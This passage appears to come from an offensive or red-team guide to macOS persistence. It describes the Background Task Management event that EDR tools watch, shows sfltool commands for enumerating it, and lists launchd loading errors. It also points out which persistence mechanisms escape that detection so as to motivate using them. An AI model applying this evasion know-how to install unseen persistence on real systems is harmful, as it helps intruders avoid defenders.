- **EDR gets an event.** `ES_EVENT_TYPE_NOTIFY_BTM_LAUNCH_ITEM_ADD` fires with the instigating and responsible processes, the item's path, and its type. This is an authoritative, real-time, first-party notification of persistence installation, and it is the single best macOS detection primitive Apple has shipped. Every serious macOS EDR consumes it.
- The BTM database lives at `/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<N>.btm` and is TCC-protected. `sfltool dumpbtm` reads it and needs Full Disk Access. <!-- VERIFY: current version integer in the filename -->

```bash
# Enumerate what BTM knows. Needs FDA, and often root.
sudo sfltool dumpbtm
sfltool list
sfltool csinfo
```

BTM does not cover everything. Anything that does not route through the launch item registration path (cron, shell profiles, application bundle modification, authorisation plugins) does not generate the event. That is the practical argument for the less obvious mechanisms below: not that they are better, but that they are outside the one place that is instrumented properly.

**Failure modes.**

- `Bootstrap failed: 5: Input/output error`: malformed plist, mismatched `Label`, or already loaded. Validate with `plutil -lint`.
- `Bootstrap failed: 37: Operation already in progress`: the label is already bootstrapped. `bootout` first.
- Job loads, exits 78: `ProgramArguments[0]` does not exist or is not executable.
- Job loads and is immediately throttled: it exited too fast and `KeepAlive` is restarting it. Add `ThrottleInterval`.
- A daemon plist with `LimitLoadToSessionType` set will not load in the system domain.
- `Load failed: 1: Operation not permitted` writing to `~/Library/LaunchAgents`: TCC. Your process lacks the required grant.
